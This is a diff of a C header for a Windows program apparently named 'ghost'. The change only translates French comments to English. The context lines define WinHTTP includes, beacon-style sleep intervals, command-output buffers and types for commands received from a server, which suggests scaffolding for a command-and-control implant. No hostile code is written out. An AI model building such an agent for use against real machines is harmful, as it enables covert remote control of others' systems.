@@ -8,9 +8,7 @@
 #ifndef COMMON_H
 #define COMMON_H
 
-/* ============================================================================
- * Windows headers - on évite d'inclure tout windows.h pour réduire la taille
- * ============================================================================ */
+/* Windows headers (minimal set to reduce binary size) */
 #define WIN32_LEAN_AND_MEAN
 #include <windows.h>
 #include <winhttp.h>
@@ -23,9 +21,7 @@
 #include <stdint.h>
 #include <stdbool.h>
 
-/* ============================================================================
- * Macros utilitaires
- * ============================================================================ */
+/* Utility macros */
 
 /* Pour éviter les warnings sur les params non utilisés */
 #define UNUSED(x) (void)(x)
@@ -48,9 +44,7 @@
 #define STATUS_CRYPTO_ERROR     4
 #define STATUS_TASK_ERROR       5
 
-/* ============================================================================
- * Tailles de buffers
- * ============================================================================ */
+/* Buffer sizes */
 #define MAX_PATH_LEN            260
 #define MAX_URL_LEN             512
 #define MAX_HOSTNAME_LEN        64
@@ -59,9 +53,7 @@
 #define MAX_RESPONSE_SIZE       (1024 * 1024)    /* 1 MB */
 #define MAX_COMMAND_OUTPUT      (512 * 1024)     /* 512 KB */
 
-/* ============================================================================
- * Constantes de l'agent
- * ============================================================================ */
+/* Agent constants */
 #define AGENT_VERSION           "1.0.0"
 #define AGENT_NAME              "ghost"
 
@@ -71,9 +63,7 @@
 #define MIN_SLEEP_MS            1000             /* 1 seconde minimum */
 #define MAX_SLEEP_MS            3600000          /* 1 heure max */
 
-/* ============================================================================
- * Types customs
- * ============================================================================ */
+/* Custom types */
 
 /* Type de commande reçue du serveur */
 typedef enum {
@@ -145,9 +135,7 @@ typedef struct {
     size_t          data_len;           /* Taille des données */
 } task_result_t;
 
-/* ============================================================================
- * Prototypes des fonctions utilitaires globales
- * ============================================================================ */
+/* Global utility prototypes */
 
 /* Génère un UUID v4 */
 void generate_uuid(char* out, size_t out_size);
